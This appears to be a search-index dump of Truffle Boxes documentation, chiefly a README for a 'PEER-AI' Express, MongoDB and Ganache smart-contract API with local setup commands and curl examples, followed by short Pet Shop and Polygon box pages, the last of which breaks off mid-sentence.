a fix. In the meantime, if you encounter this, it is safe to simply rerun that migration with truffle migrate --network=optimistic_goerli --config=truffle-config.ovm --f 4 --to 4 --skip-dry-run .", "title": "Known Issues"}, {"location": "boxes/optimism-bridge/#briding-eth-demo", "text": "The script goerli_bridge_value.mjs demonstrates how to send ETH and DAI across each side of the bridge. To run it, you will also need DAI on the Goerli network. You can go to Uniswap to exchange ETH for DAI on Goerli. Then call: node ./scripts/goerli_bridge_value.js", "title": "Briding Eth Demo"}, {"location": "boxes/optimism-bridge/#developing-for-optimism", "text": "To learn more about developing for Optimism, see the Truffle Optimism Box", "title": "Developing for Optimism"}, {"location": "boxes/optimism-bridge/#support", "text": "Support for this box is available via the Truffle community available here .", "title": "Support"}, {"location": "boxes/peerai-api/", "text": "README \u00b6 PEER-AI \u00b6 About - Peerism API built with Truffle, Node.js, Express.js, Mongoose, MongoDB, Solidity, and Ganache CLI (TestRPC). Instructions - Setup instructions (for macOS) are provided in the Quick Start Guide shown below. Usage Capabilities - Use cURL to simulate a HTTP POST request to a Peerism API endpoint (instead of sending a request from the Peerism React Native \u00d0App https://github.com/peerism/peer.ai). Alternatively allows triggering Middleware functions individually. API routes use an Express.js Middleware Chain that allow a request to compile the Peerism Smart Contract using Solidity Compiler (Solc) and Ether Pudding, then deploy it to the Ethereum TestRPC test network blockchain and responds with the contract address. Table of Contents \u00b6 Quick Start Guide Log FAQ TODO References Quick Start Guide \u00b6 Terminal Tab #1 - Install dependencies including Ganache CLI (TestRPC from the Truffle Suite) nvm install v9.3.0; nvm use; nvm use v9.3.0; yarn install; npm install -g ganache-cli Terminal Tab #1 - Run MongoDB Server in a separate Terminal tab mongod Terminal Tab #2 - Run Ethereum Client using Ganache CLI (TestRPC). rm -rf ./db; mkdir -p db/chaindb; ganache-cli --account '0x0000000000000000000000000000000000000000000000000000000000000001, 10002471238800000000000' \\ --account '0x0000000000000000000000000000000000000000000000000000000000000002, 10004471238800000000000' \\ --unlock '0x0000000000000000000000000000000000000000000000000000000000000001' \\ --unlock '0x0000000000000000000000000000000000000000000000000000000000000002' \\ --unlock '0x7e5f4552091a69125d5dfcb7b8c2659029395bdf' \\ --unlock '0x2b5ad5c4795c026514f8317c7a215e218dccd6cf' \\ --blocktime 0 \\ --deterministic true \\ --port 8545 \\ --hostname localhost \\ --gasPrice 20000000000 \\ --gasLimit 0x8000000 \\ --debug true \\ --mem true \\ --networkId 1337 \\ --db './db/chaindb' Terminal Tab #3 - Compile and Deploy Smart Contracts to TestRPC blockchain Compile Smart Contracts Option 1: Generates build/contracts/Peerism.sol.js node lib/compileContract.js Peerism Option 2: Genertes build/contracts/Peerism.json (DEPRECATED) truffle compile --compile-all; Deploy Smart Contracts Option 1: Deploy without Truffle Modify Bitcore dependency before running the next command to avoid error Error: More than one instance of bitcore-lib found. Please make sure to require bitcore-lib and check that submodules do not also include their own bitcore-lib dependency. , as described here: https://github.com/bitpay/bitcore/issues/1454, by opening node_modules/bitcore-mnemonic/node_modules/bitcore-lib/index.js and commented out the following lines of code to avoid an error. bitcore.versionGuard = function(version) { // if (version !== undefined) { // var message = 'More than one instance of bitcore-lib found. ' + // 'Please make sure to require bitcore-lib and check that submodules do' + // ' not also include their own bitcore-lib dependency.'; // throw new Error(message); // } }; node lib/deployContract.js Peerism Option 2: Deploy with Truffle (DEPRECATED) truffle migrate --reset --network development; Note: Watch the deployment transactions being send to the blockchain in Terminal Tab #2 Terminal Tab #3 - Run Tests truffle test; Terminal Tab #4 - Drop the server. Run server, then try cURL requests yarn run drop; yarn run dev; Terminal Tab #4 - Send request to server and receive response for authentication and authorisation to access specific API endpoints. cURL Register with email/password. JWT provided in response (i.e. {\"token\":\"xyz\"} ) curl -v -X POST http://localhost:7000/users/auth/register -d \"email=luke@schoen.com&password=123456&name=Luke\" -H \"Content-Type: application/x-www-form-urlencoded\" curl -v -X POST http://localhost:7000/users/auth/register -d '{\"email\":\"gavin@wood.com\", \"password\":\"123456\", \"name\":\"Gavin\"}' -H \"Content-Type: application/json\" Sign in with email/password. JWT provided in response (i.e. {\"token\":\"xyz\"} ) curl -v -X POST http://localhost:7000/users/auth -d \"email=luke@schoen.com&password=123456\" -H \"Content-Type: application/x-www-form-urlencoded\" curl -v -X POST http://localhost:7000/users/auth -d '{\"email\":\"gavin@wood.com\", \"password\":\"123456\"}' -H \"Content-Type: application/json\" Access a restricted endpoint by providing JWT curl -v -X GET http://localhost:7000/users -H \"Content-Type: application/json\" -H \"Authorization: Bearer <INSERT_TOKEN>\" Create user by providing JWT curl -v -X POST http://localhost:7000/users/create --data '[{\"email\":\"test@fake.com\", \"name\":\"Test\"}]' -H \"Content-Type: application/json\" -H \"Authorization: JWT <INSERT_TOKEN>\" curl -v -X POST http://localhost:7000/users/create -d \"email=test2@fake.com&name=Test2\" -H \"Content-Type: application/x-www-form-urlencoded\" -H \"Authorization: JWT <INSERT_TOKEN>\" Terminal Tab #4 - Send request to server with Smart Contract Name to be Compiled and Deployed to the Ethereum TestRPC and receive response with the Contract Address. cURL curl -v -X POST http://localhost:7000/contracts/generate -d '{\"contractName\":\"Peerism\"}' -H \"Content-Type: application/json\" Terminal Tab #4 - Experiment in REPL Use Truffle Console Run Truffle Console truffle console --network development; Run commands web3 web3.currentProvider web3.eth.getBalance('0x7e5f4552091a69125d5dfcb7b8c2659029395bdf') Attach to EthereumJS TestRPC using Go Ethereum (Geth) Install Geth Start Geth JavaScript console geth attach rpc:http://localhost:8545 Run commands web3 web3.currentProvider web3.eth.getBalance('0x7e5f4552091a69125d5dfcb7b8c2659029395bdf') eth.accounts Optional: Try to perform RPC calls to Ganache TestRPC using cURL. https://github.com/trufflesuite/ganache-cli/issues/383 Terminal Tab #5 - Run Tests on port 7111 yarn run drop; yarn run test-watch Terminal Tab #1 - Drop the database. Seed the database yarn run drop; yarn run seed; Log \u00b6 Initial setup git init; touch README.md; touch .gitignore; code .; Add boilerplate contents to .gitignore for Node.js Setup API yarn init -y; yarn add express body-parser; yarn add nodemon --dev; touch server.js; Add boilerplate contents to server.js Add \"dev\" in \"scripts\" section of package.json Add Mongoose yarn add mongoose; mkdir models; touch models/init.js; touch models/User.js; touch models/seeds.js; touch models/drop.js Create Models for Mongoose Add boilerplate contents to models Add scripts to package.json Run MongoDB Server mongod MongoDB Client mongo show dbs use peerai show collections db.users.find({}) db.skills.find({}) Create routes mkdir routes Modify server.js. Add routes/users.js Add authentication with Passport, Passport-Local, and Passport-Local-Mongoose : yarn add passport passport-local passport-local-mongoose Rename Person and people to User and users Add User Registration route Add User Sign in route Add JWT library to return a token instead of a user yarn add jsonwebtoken; Add Passport JWT library yarn add passport-jwt Add restricted endpoint that requires valid JWT to access Add Controllers https://developer.mozilla.org/en-US/docs/Learn/Server-side/Express_Nodejs/routes Add Route Tests yarn add mocha chai chai-http --dev; mkdir -p test/routes; touch test/routes/users_test.js; Add Model Tests mkdir test/models; touch test/models/users_test.js Add Dotenv library to use different database in development and testing yarn add lodash; yarn add dotenv --dev; touch .sample-env; echo 'NODE_ENV=development' >> ./.sample-env; Add Ethereum dependencies including TestRPC yarn add web3@0.19 ethereumjs-util@4.4 ethereumjs-tx@1.3 eth-lightwallet@2.5; yarn add ethereumjs-testrpc --dev; yarn add solc ether-pudding --dev; yarn add truffle-artifactor --dev; References https://medium.com/@codetractio/try-out-ethereum-using-only-nodejs-and-npm-eabaaaf97c80 Smart Contracts without Truffle - https://medium.com/@doart3/ethereum-dapps-without-truffle-compile-deploy-use-it-e6daeefcf919 EthereumJS Util - Library for cryptographic hashes for Ethereum addresses - https://github.com/ethereumjs/ethereumjs-util EthereumJS Tx - library to create, edit, and sign Ethereum transactions - https://github.com/ethereumjs/ethereumjs-tx EthereumJS LightWallet - https://github.com/ConsenSys/eth-lightwallet Solc - Compile Solidity Contract - https://www.npmjs.com/package/solc Ether Pudding - Manage Solidity Contracts and Packages - https://www.npmjs.com/package/ether-pudding Truffle Artifactor - replaces Ether Pudding - https://github.com/trufflesuite/truffle-artifactor Reading from JSON files - https://www.codementor.io/codementorteam/how-to-use-json-files-in-node-js-85hndqt32 Problem: Tried to manually compile using Solc with node lib/compileContract.js ConvertLib , which generates ConvertLib.solc.js in build/contracts. However it does not compile MetaCoin.sol, as it returns error 1:27: ParserError: Source \"ConvertLib.sol\" not found: File not supplied initially.\\n ... import \"./ConvertLib.sol\" . Solution: Use Truffle to compile Solidity contracts with truffle compile --compile-all Run shell script in new Terminal tab (copy from https://github.com/ltfschoen/solidity_test/blob/master/testrpc.sh) rm -rf ./db; mkdir db && mkdir db/chaindb; cd ~/code/blockchain/solidity_test; testrpc --account '0x0000000000000000000000000000000000000000000000000000000000000001, 10002471238800000000000' \\ --account '0x0000000000000000000000000000000000000000000000000000000000000002, 10004471238800000000000' \\ --account '0x0000000000000000000000000000000000000000000000000000000000000003, 10004471238800000000000' \\ --account '0x0000000000000000000000000000000000000000000000000000000000000004, 10004471238800000000000' \\ --account '0x0000000000000000000000000000000000000000000000000000000000000005, 10004471238800000000000' \\ --account '0x0000000000000000000000000000000000000000000000000000000000000006, 10004471238800000000000' \\ --account '0x0000000000000000000000000000000000000000000000000000000000000007, 10004471238800000000000' \\ --unlock '0x0000000000000000000000000000000000000000000000000000000000000001' \\ --unlock '0x0000000000000000000000000000000000000000000000000000000000000002' \\ --unlock '0x0000000000000000000000000000000000000000000000000000000000000003' \\ --unlock '0x0000000000000000000000000000000000000000000000000000000000000004' \\ --unlock '0x0000000000000000000000000000000000000000000000000000000000000005' \\ --unlock '0x0000000000000000000000000000000000000000000000000000000000000006' \\ --unlock '0x0000000000000000000000000000000000000000000000000000000000000007' \\ --unlock '0x7e5f4552091a69125d5dfcb7b8c2659029395bdf' \\ --unlock '0x2b5ad5c4795c026514f8317c7a215e218dccd6cf' \\ --blocktime 0 \\ --deterministic true \\ --port 8545 \\ --hostname localhost \\ --gasPrice 20000000000 \\ --gasLimit 1000000 \\ --debug true \\ --mem true \\ --db './db/chaindb' Install Truffle npm install -g truffle; truffle init; Run Truffle Unbox in separate directory to get template Metacoin example and move relevant boilerplate contracts and tests into the the root folder Update package.json tests script to run tests for Smart Contracts and API tests: \"test\": \"truffle test; NODE_ENV=testing mocha --recursive test/**/*_test.js\", Remove truffle-config.js and add the following to truffle.js: module.exports = { // http://truffleframework.com/docs/advanced/configuration networks: { development: { host: \"localhost\", port: 8545, network_id: \"*\" // Match any network id } } }; Add ethpm.json for EthPM Package Management { \"package_name\": \"truffle-box-peerism-api-node-express\", \"version\": \"0.0.1\", \"description\": \"Truffle Box of Peerism API built with Truffle, Node.js, Express.js, Solidity, Ether Pudding, and Ethereum TestRPC\", \"authors\": [ \"Luke Schoen <ltfschoen@gmail.com>\" ], \"keywords\": [ \"ethereum\", \"express.js\", \"node.js\", \"middleware\", \"api\" ], \"license\": \"MIT\" } References: http://truffleframework.com/docs/getting_started/packages-ethpm Open node_modules/bitcore-mnemonic/node_modules/bitcore-lib/index.js and commented out the following lines of code to avoid an error. bitcore.versionGuard = function(version) { // if (version !== undefined) { // var message = 'More than one instance of bitcore-lib found. ' + // 'Please make sure to require bitcore-lib and check that submodules do' + // ' not also include their own bitcore-lib dependency.'; // throw new Error(message); // } }; Run Truffle Console experimentation truffle console --network development; Build script for Smart Contract (generates .sol.js file in build/contracts/) mkdir lib; node lib/compileContract.js Peerism Alternatively compile with Truffle Deployment script for Smart Contract Reference: https://medium.com/@codetractio/try-out-ethereum-using-only-nodejs-and-npm-eabaaaf97c80 touch lib/deployContract.js; node lib/deployContract.js Peerism; References: http://truffleframework.com/docs/getting_started/contracts Gas Limits - https://bitcoin.stackexchange.com/questions/39132/what-is-gas-limit-in-ethereum FAQ \u00b6 How to understand how to use Passport JWT library? Refer to the library codebase on Github or in node_modules/jsonwebtoken/ i.e. verify.js Use breakpoints Experiment using Node. i.e. Run node then npm install jsonwebtoken const JWT = require('jsonwebtoken'); JWT.decode(\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6Imx0ZnNjaG9lbkBnbWFpbC5jb20iLCJpYXQiOjE1MTMwNjY3NTEsImV4cCI6MTUxMzY3MTU1MSwic3ViIjoiNWEyZjkwZmZiNTI5YjI0YzM5MTA1NWM3In0.MkcCR1YD2c21x_WOQObyY-UPAQDWTcooOiO69saUVMI\") References \u00b6 Express.js server API with JWT authorisation Express.js Routes TODO \u00b6 [ ] Integrate with Peerism React Native app [X] Integrate Solidity smart contract using TestRPC [ ] Create a Truffle Box https://github.com/trufflesuite/truffle/issues/433 http://truffleframework.com/boxes/ [ ] Upgrade to latest Web3 1.0.0 Beta-27 that has been successfully used in https://github.com/ltfschoen/geth-node to deploy a FixedSupplyToken.sol smart contract to a Private Network with Geth", "title": "README"}, {"location": "boxes/peerai-api/#readme", "text": "", "title": "README"}, {"location": "boxes/peerai-api/#peer-ai", "text": "About - Peerism API built with Truffle, Node.js, Express.js, Mongoose, MongoDB, Solidity, and Ganache CLI (TestRPC). Instructions - Setup instructions (for macOS) are provided in the Quick Start Guide shown below. Usage Capabilities - Use cURL to simulate a HTTP POST request to a Peerism API endpoint (instead of sending a request from the Peerism React Native \u00d0App https://github.com/peerism/peer.ai). Alternatively allows triggering Middleware functions individually. API routes use an Express.js Middleware Chain that allow a request to compile the Peerism Smart Contract using Solidity Compiler (Solc) and Ether Pudding, then deploy it to the Ethereum TestRPC test network blockchain and responds with the contract address.", "title": "PEER-AI"}, {"location": "boxes/peerai-api/#table-of-contents", "text": "Quick Start Guide Log FAQ TODO References", "title": "Table of Contents"}, {"location": "boxes/peerai-api/#quick-start-guide", "text": "Terminal Tab #1 - Install dependencies including Ganache CLI (TestRPC from the Truffle Suite) nvm install v9.3.0; nvm use; nvm use v9.3.0; yarn install; npm install -g ganache-cli Terminal Tab #1 - Run MongoDB Server in a separate Terminal tab mongod Terminal Tab #2 - Run Ethereum Client using Ganache CLI (TestRPC). rm -rf ./db; mkdir -p db/chaindb; ganache-cli --account '0x0000000000000000000000000000000000000000000000000000000000000001, 10002471238800000000000' \\ --account '0x0000000000000000000000000000000000000000000000000000000000000002, 10004471238800000000000' \\ --unlock '0x0000000000000000000000000000000000000000000000000000000000000001' \\ --unlock '0x0000000000000000000000000000000000000000000000000000000000000002' \\ --unlock '0x7e5f4552091a69125d5dfcb7b8c2659029395bdf' \\ --unlock '0x2b5ad5c4795c026514f8317c7a215e218dccd6cf' \\ --blocktime 0 \\ --deterministic true \\ --port 8545 \\ --hostname localhost \\ --gasPrice 20000000000 \\ --gasLimit 0x8000000 \\ --debug true \\ --mem true \\ --networkId 1337 \\ --db './db/chaindb' Terminal Tab #3 - Compile and Deploy Smart Contracts to TestRPC blockchain Compile Smart Contracts Option 1: Generates build/contracts/Peerism.sol.js node lib/compileContract.js Peerism Option 2: Genertes build/contracts/Peerism.json (DEPRECATED) truffle compile --compile-all; Deploy Smart Contracts Option 1: Deploy without Truffle Modify Bitcore dependency before running the next command to avoid error Error: More than one instance of bitcore-lib found. Please make sure to require bitcore-lib and check that submodules do not also include their own bitcore-lib dependency. , as described here: https://github.com/bitpay/bitcore/issues/1454, by opening node_modules/bitcore-mnemonic/node_modules/bitcore-lib/index.js and commented out the following lines of code to avoid an error. bitcore.versionGuard = function(version) { // if (version !== undefined) { // var message = 'More than one instance of bitcore-lib found. ' + // 'Please make sure to require bitcore-lib and check that submodules do' + // ' not also include their own bitcore-lib dependency.'; // throw new Error(message); // } }; node lib/deployContract.js Peerism Option 2: Deploy with Truffle (DEPRECATED) truffle migrate --reset --network development; Note: Watch the deployment transactions being send to the blockchain in Terminal Tab #2 Terminal Tab #3 - Run Tests truffle test; Terminal Tab #4 - Drop the server. Run server, then try cURL requests yarn run drop; yarn run dev; Terminal Tab #4 - Send request to server and receive response for authentication and authorisation to access specific API endpoints. cURL Register with email/password. JWT provided in response (i.e. {\"token\":\"xyz\"} ) curl -v -X POST http://localhost:7000/users/auth/register -d \"email=luke@schoen.com&password=123456&name=Luke\" -H \"Content-Type: application/x-www-form-urlencoded\" curl -v -X POST http://localhost:7000/users/auth/register -d '{\"email\":\"gavin@wood.com\", \"password\":\"123456\", \"name\":\"Gavin\"}' -H \"Content-Type: application/json\" Sign in with email/password. JWT provided in response (i.e. {\"token\":\"xyz\"} ) curl -v -X POST http://localhost:7000/users/auth -d \"email=luke@schoen.com&password=123456\" -H \"Content-Type: application/x-www-form-urlencoded\" curl -v -X POST http://localhost:7000/users/auth -d '{\"email\":\"gavin@wood.com\", \"password\":\"123456\"}' -H \"Content-Type: application/json\" Access a restricted endpoint by providing JWT curl -v -X GET http://localhost:7000/users -H \"Content-Type: application/json\" -H \"Authorization: Bearer <INSERT_TOKEN>\" Create user by providing JWT curl -v -X POST http://localhost:7000/users/create --data '[{\"email\":\"test@fake.com\", \"name\":\"Test\"}]' -H \"Content-Type: application/json\" -H \"Authorization: JWT <INSERT_TOKEN>\" curl -v -X POST http://localhost:7000/users/create -d \"email=test2@fake.com&name=Test2\" -H \"Content-Type: application/x-www-form-urlencoded\" -H \"Authorization: JWT <INSERT_TOKEN>\" Terminal Tab #4 - Send request to server with Smart Contract Name to be Compiled and Deployed to the Ethereum TestRPC and receive response with the Contract Address. cURL curl -v -X POST http://localhost:7000/contracts/generate -d '{\"contractName\":\"Peerism\"}' -H \"Content-Type: application/json\" Terminal Tab #4 - Experiment in REPL Use Truffle Console Run Truffle Console truffle console --network development; Run commands web3 web3.currentProvider web3.eth.getBalance('0x7e5f4552091a69125d5dfcb7b8c2659029395bdf') Attach to EthereumJS TestRPC using Go Ethereum (Geth) Install Geth Start Geth JavaScript console geth attach rpc:http://localhost:8545 Run commands web3 web3.currentProvider web3.eth.getBalance('0x7e5f4552091a69125d5dfcb7b8c2659029395bdf') eth.accounts Optional: Try to perform RPC calls to Ganache TestRPC using cURL. https://github.com/trufflesuite/ganache-cli/issues/383 Terminal Tab #5 - Run Tests on port 7111 yarn run drop; yarn run test-watch Terminal Tab #1 - Drop the database. Seed the database yarn run drop; yarn run seed;", "title": "Quick Start Guide "}, {"location": "boxes/peerai-api/#log", "text": "Initial setup git init; touch README.md; touch .gitignore; code .; Add boilerplate contents to .gitignore for Node.js Setup API yarn init -y; yarn add express body-parser; yarn add nodemon --dev; touch server.js; Add boilerplate contents to server.js Add \"dev\" in \"scripts\" section of package.json Add Mongoose yarn add mongoose; mkdir models; touch models/init.js; touch models/User.js; touch models/seeds.js; touch models/drop.js Create Models for Mongoose Add boilerplate contents to models Add scripts to package.json Run MongoDB Server mongod MongoDB Client mongo show dbs use peerai show collections db.users.find({}) db.skills.find({}) Create routes mkdir routes Modify server.js. Add routes/users.js Add authentication with Passport, Passport-Local, and Passport-Local-Mongoose : yarn add passport passport-local passport-local-mongoose Rename Person and people to User and users Add User Registration route Add User Sign in route Add JWT library to return a token instead of a user yarn add jsonwebtoken; Add Passport JWT library yarn add passport-jwt Add restricted endpoint that requires valid JWT to access Add Controllers https://developer.mozilla.org/en-US/docs/Learn/Server-side/Express_Nodejs/routes Add Route Tests yarn add mocha chai chai-http --dev; mkdir -p test/routes; touch test/routes/users_test.js; Add Model Tests mkdir test/models; touch test/models/users_test.js Add Dotenv library to use different database in development and testing yarn add lodash; yarn add dotenv --dev; touch .sample-env; echo 'NODE_ENV=development' >> ./.sample-env; Add Ethereum dependencies including TestRPC yarn add web3@0.19 ethereumjs-util@4.4 ethereumjs-tx@1.3 eth-lightwallet@2.5; yarn add ethereumjs-testrpc --dev; yarn add solc ether-pudding --dev; yarn add truffle-artifactor --dev; References https://medium.com/@codetractio/try-out-ethereum-using-only-nodejs-and-npm-eabaaaf97c80 Smart Contracts without Truffle - https://medium.com/@doart3/ethereum-dapps-without-truffle-compile-deploy-use-it-e6daeefcf919 EthereumJS Util - Library for cryptographic hashes for Ethereum addresses - https://github.com/ethereumjs/ethereumjs-util EthereumJS Tx - library to create, edit, and sign Ethereum transactions - https://github.com/ethereumjs/ethereumjs-tx EthereumJS LightWallet - https://github.com/ConsenSys/eth-lightwallet Solc - Compile Solidity Contract - https://www.npmjs.com/package/solc Ether Pudding - Manage Solidity Contracts and Packages - https://www.npmjs.com/package/ether-pudding Truffle Artifactor - replaces Ether Pudding - https://github.com/trufflesuite/truffle-artifactor Reading from JSON files - https://www.codementor.io/codementorteam/how-to-use-json-files-in-node-js-85hndqt32 Problem: Tried to manually compile using Solc with node lib/compileContract.js ConvertLib , which generates ConvertLib.solc.js in build/contracts. However it does not compile MetaCoin.sol, as it returns error 1:27: ParserError: Source \"ConvertLib.sol\" not found: File not supplied initially.\\n ... import \"./ConvertLib.sol\" . Solution: Use Truffle to compile Solidity contracts with truffle compile --compile-all Run shell script in new Terminal tab (copy from https://github.com/ltfschoen/solidity_test/blob/master/testrpc.sh) rm -rf ./db; mkdir db && mkdir db/chaindb; cd ~/code/blockchain/solidity_test; testrpc --account '0x0000000000000000000000000000000000000000000000000000000000000001, 10002471238800000000000' \\ --account '0x0000000000000000000000000000000000000000000000000000000000000002, 10004471238800000000000' \\ --account '0x0000000000000000000000000000000000000000000000000000000000000003, 10004471238800000000000' \\ --account '0x0000000000000000000000000000000000000000000000000000000000000004, 10004471238800000000000' \\ --account '0x0000000000000000000000000000000000000000000000000000000000000005, 10004471238800000000000' \\ --account '0x0000000000000000000000000000000000000000000000000000000000000006, 10004471238800000000000' \\ --account '0x0000000000000000000000000000000000000000000000000000000000000007, 10004471238800000000000' \\ --unlock '0x0000000000000000000000000000000000000000000000000000000000000001' \\ --unlock '0x0000000000000000000000000000000000000000000000000000000000000002' \\ --unlock '0x0000000000000000000000000000000000000000000000000000000000000003' \\ --unlock '0x0000000000000000000000000000000000000000000000000000000000000004' \\ --unlock '0x0000000000000000000000000000000000000000000000000000000000000005' \\ --unlock '0x0000000000000000000000000000000000000000000000000000000000000006' \\ --unlock '0x0000000000000000000000000000000000000000000000000000000000000007' \\ --unlock '0x7e5f4552091a69125d5dfcb7b8c2659029395bdf' \\ --unlock '0x2b5ad5c4795c026514f8317c7a215e218dccd6cf' \\ --blocktime 0 \\ --deterministic true \\ --port 8545 \\ --hostname localhost \\ --gasPrice 20000000000 \\ --gasLimit 1000000 \\ --debug true \\ --mem true \\ --db './db/chaindb' Install Truffle npm install -g truffle; truffle init; Run Truffle Unbox in separate directory to get template Metacoin example and move relevant boilerplate contracts and tests into the the root folder Update package.json tests script to run tests for Smart Contracts and API tests: \"test\": \"truffle test; NODE_ENV=testing mocha --recursive test/**/*_test.js\", Remove truffle-config.js and add the following to truffle.js: module.exports = { // http://truffleframework.com/docs/advanced/configuration networks: { development: { host: \"localhost\", port: 8545, network_id: \"*\" // Match any network id } } }; Add ethpm.json for EthPM Package Management { \"package_name\": \"truffle-box-peerism-api-node-express\", \"version\": \"0.0.1\", \"description\": \"Truffle Box of Peerism API built with Truffle, Node.js, Express.js, Solidity, Ether Pudding, and Ethereum TestRPC\", \"authors\": [ \"Luke Schoen <ltfschoen@gmail.com>\" ], \"keywords\": [ \"ethereum\", \"express.js\", \"node.js\", \"middleware\", \"api\" ], \"license\": \"MIT\" } References: http://truffleframework.com/docs/getting_started/packages-ethpm Open node_modules/bitcore-mnemonic/node_modules/bitcore-lib/index.js and commented out the following lines of code to avoid an error. bitcore.versionGuard = function(version) { // if (version !== undefined) { // var message = 'More than one instance of bitcore-lib found. ' + // 'Please make sure to require bitcore-lib and check that submodules do' + // ' not also include their own bitcore-lib dependency.'; // throw new Error(message); // } }; Run Truffle Console experimentation truffle console --network development; Build script for Smart Contract (generates .sol.js file in build/contracts/) mkdir lib; node lib/compileContract.js Peerism Alternatively compile with Truffle Deployment script for Smart Contract Reference: https://medium.com/@codetractio/try-out-ethereum-using-only-nodejs-and-npm-eabaaaf97c80 touch lib/deployContract.js; node lib/deployContract.js Peerism; References: http://truffleframework.com/docs/getting_started/contracts Gas Limits - https://bitcoin.stackexchange.com/questions/39132/what-is-gas-limit-in-ethereum", "title": "Log "}, {"location": "boxes/peerai-api/#faq", "text": "How to understand how to use Passport JWT library? Refer to the library codebase on Github or in node_modules/jsonwebtoken/ i.e. verify.js Use breakpoints Experiment using Node. i.e. Run node then npm install jsonwebtoken const JWT = require('jsonwebtoken'); JWT.decode(\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6Imx0ZnNjaG9lbkBnbWFpbC5jb20iLCJpYXQiOjE1MTMwNjY3NTEsImV4cCI6MTUxMzY3MTU1MSwic3ViIjoiNWEyZjkwZmZiNTI5YjI0YzM5MTA1NWM3In0.MkcCR1YD2c21x_WOQObyY-UPAQDWTcooOiO69saUVMI\")", "title": "FAQ "}, {"location": "boxes/peerai-api/#references", "text": "Express.js server API with JWT authorisation Express.js Routes", "title": "References "}, {"location": "boxes/peerai-api/#todo", "text": "[ ] Integrate with Peerism React Native app [X] Integrate Solidity smart contract using TestRPC [ ] Create a Truffle Box https://github.com/trufflesuite/truffle/issues/433 http://truffleframework.com/boxes/ [ ] Upgrade to latest Web3 1.0.0 Beta-27 that has been successfully used in https://github.com/ltfschoen/geth-node to deploy a FixedSupplyToken.sol smart contract to a Private Network with Geth", "title": "TODO "}, {"location": "boxes/pet-shop/", "text": "Pet Shop Truffle Box \u00b6 This box has all you need to get started with our Pet Shop tutorial . Installation \u00b6 Install Truffle globally. npm install - g truffle Download the box. This also takes care of installing the necessary dependencies. truffle unbox pet - shop Run the development console. truffle develop Compile and migrate the smart contracts. Note inside the development console we don't preface commands with truffle . compile migrate Run the liteserver development server (outside the development console) for front-end hot reloading. Smart contract changes must be manually recompiled and migrated. // Serves the front-end on http://localhost:3000 npm run dev NOTE : This box is not a complete dapp, but the starting point for the Pet Shop tutorial . You'll need to complete that for this to function. FAQ \u00b6 How do I use this with the EthereumJS TestRPC? It's as easy as modifying the config file! Check out our documentation on adding network configurations . Depending on the port you're using, you'll also need to update line 16 of src/js/app.js .", "title": "Pet Shop Truffle Box"}, {"location": "boxes/pet-shop/#pet-shop-truffle-box", "text": "This box has all you need to get started with our Pet Shop tutorial .", "title": "Pet Shop Truffle Box"}, {"location": "boxes/pet-shop/#installation", "text": "Install Truffle globally. npm install - g truffle Download the box. This also takes care of installing the necessary dependencies. truffle unbox pet - shop Run the development console. truffle develop Compile and migrate the smart contracts. Note inside the development console we don't preface commands with truffle . compile migrate Run the liteserver development server (outside the development console) for front-end hot reloading. Smart contract changes must be manually recompiled and migrated. // Serves the front-end on http://localhost:3000 npm run dev NOTE : This box is not a complete dapp, but the starting point for the Pet Shop tutorial . You'll need to complete that for this to function.", "title": "Installation"}, {"location": "boxes/pet-shop/#faq", "text": "How do I use this with the EthereumJS TestRPC? It's as easy as modifying the config file! Check out our documentation on adding network configurations . Depending on the port you're using, you'll also need to update line 16 of src/js/app.js .", "title": "FAQ"}, {"location": "boxes/polygon/", "text": "Polygon Box \u00b6 Requirements Installation Setup Using the .env File New Configuration File New Directory Structure for Artifacts Polygon PoS Chain Compiling Migrating Paying For Migrations Basic Commands Testing Communication Between Ethereum and Polygon PoS Chains Support Table of contents generated with markdown-toc This Truffle Polygon box provides you with the boilerplate structure necessary to start coding for Polygon's Ethereum L2 solution, the Polygon PoS chain (previously called the Matic PoS chain). For detailed information on how the Polygon PoS chain works, please see their documentation here . As a starting point, this box contains only the SimpleStorage Solidity contract. Including minimal code was a conscious decision as this box is meant to provide the initial building blocks needed to get to work on Polygon PoS without pushing developers to write any particular sort of application. With this box, you will be able to compile, migrate, and test Solidity code against several instances of Polygon PoS networks. Polygon's L2 solution is fully compatible with the EVM. This means you will not need a new compiler to deploy Solidity contracts, and should be able to add your own Solidity contracts to this project. The main difference developers will encounter is in accessing and interacting with the Polygon PoS network. Additionally, Polygon offers multiple ways for dapp developers to implement communication between Ethereum (\"Layer 1\") and Polygon PoS. Further information about how to enable Ethereum-Polygon communication can be found in the Polygon documentation here . A note about naming: The Polygon ecosystem was previously called Matic Network. The chain to which we'll be deploying in this Truffle Box is now called the Polygon PoS chain. We have named this box the Polygon Box because we expect to include the ability to deploy to future Polygon chains in addition to what is presented here as an initial proof-of-concept, and developers using this Polygon Box may find themselves incorporating additional aspects of the Polygon ecosystem in their work. Requirements \u00b6 The Polygon box has the following requirements: Node.js 10.x or later NPM version 5.2 or later Windows, Linux or MacOS Helpful, but optional: An Infura account and Project ID A MetaMask account Installation \u00b6 $ truffle unbox polygon Setup \u00b6 Using the env File \u00b6 You will need at least one mnemonic to use with the network. The .dotenv npm package has been installed for you, and you will need to create a .env file for storing your mnemonic and any other needed private information. The .env file is ignored by git in this project, to help protect your private data. In general, it is good security practice to avoid committing information about your private keys to github. The truffle-config.polygon.js file expects a MNEMONIC value to exist in .env for running migrations on the networks listed in truffle-config.polygon.js . If you are unfamiliar with using .env for managing your mnemonics and other keys, the basic steps for doing so are below: Use touch .env in the command line to create a .env file at the root of your project. Open the .env file in your preferred IDE Add the following, filling in your own mnemonic and Infura project key: MNEMONIC=\"<Your Mnemonic>\" INFURA_PROJECT_ID=\"<Your Infura Project ID>\" As you develop your project, you can put any other sensitive information in this file. You can access it from other files with require('dotenv').config() and refer to the variable you need with process.env['<YOUR_VARIABLE>'] . New Configuration File \u00b6 A new configuration file exists in this project: truffle-config.polygon.js . This file contains a reference to the new file location of the contracts_build_directory for Polygon PoS contracts and lists several networks that are running the Polygon PoS Layer 2 network instance (see below ). Please note, the classic truffle-config.js configuration file is included here as well, because you will eventually want to deploy contracts to Ethereum as well. All normal truffle commands ( truffle compile , truffle migrate , etc.) will use this config file and save built files to build/ethereum-contracts . You can save Solidity contracts that you wish to deploy to Ethereum in the contracts/ethereum folder. New Directory Structure for Artifacts \u00b6 When you compile or migrate, the resulting json files will be at build/polygon-contracts/ . This is to 